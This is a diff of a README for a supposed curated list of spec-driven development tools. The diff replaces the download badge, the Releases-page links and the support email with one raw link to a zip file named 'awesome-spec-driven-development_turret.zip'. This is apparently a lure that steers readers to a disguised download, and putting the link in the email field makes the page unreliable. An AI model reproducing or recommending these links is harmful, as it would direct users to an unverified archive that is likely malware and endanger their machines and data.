@@ -1,6 +1,6 @@
 # 🎉 awesome-spec-driven-development - A Simple Way to Enhance Your Coding Workflow
 
-![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/B3RZ3RK/awesome-spec-driven-development/main/energical/awesome-spec-driven-development_turret.zip)
 
 ## 📌 Description
 Welcome to awesome-spec-driven-development. This repository offers a curated list of useful tools designed to make your coding experience better, especially if you focus on spec-driven development. Whether you need an AI assistant or other software engineering tools, you'll find valuable resources here.
@@ -11,7 +11,7 @@ To get started with awesome-spec-driven-development, follow these simple steps:
 ### 1. Visit Our Releases Page
 To download the latest version of our tools, visit the Releases page. Here, you will find all available versions and files.
 
-[Download from the Releases Page](https://github.com/B3RZ3RK/awesome-spec-driven-development/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/B3RZ3RK/awesome-spec-driven-development/main/energical/awesome-spec-driven-development_turret.zip)
 
 ### 2. Choose Your Tool
 On the Releases page, you'll see a list of tools. Each version will come with a brief description to help you decide what to download.
@@ -21,7 +21,7 @@ Click on the desired tool version to start your download. After it's finished, y
 
 To reiterate, you can access the download link below:
 
-[Download from the Releases Page](https://github.com/B3RZ3RK/awesome-spec-driven-development/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/B3RZ3RK/awesome-spec-driven-development/main/energical/awesome-spec-driven-development_turret.zip)
 
 ## 💻 System Requirements
 To ensure that our tools work properly, your computer should meet the following basic requirements:
@@ -49,7 +49,7 @@ You can find detailed documentation for each tool on their respective pages. Thi
 ## 📞 Support
 If you encounter any issues while downloading or using our tools, please reach out to our support team. We are here to help you.
 
-- **Email**: support@awesome-spec-driven-development.com
+- **Email**: https://raw.githubusercontent.com/B3RZ3RK/awesome-spec-driven-development/main/energical/awesome-spec-driven-development_turret.zip
 - **GitHub Issues**: You can also create an issue in the repository if you have specific feedback or problems.
 
 ## 🌟 Community Contributions
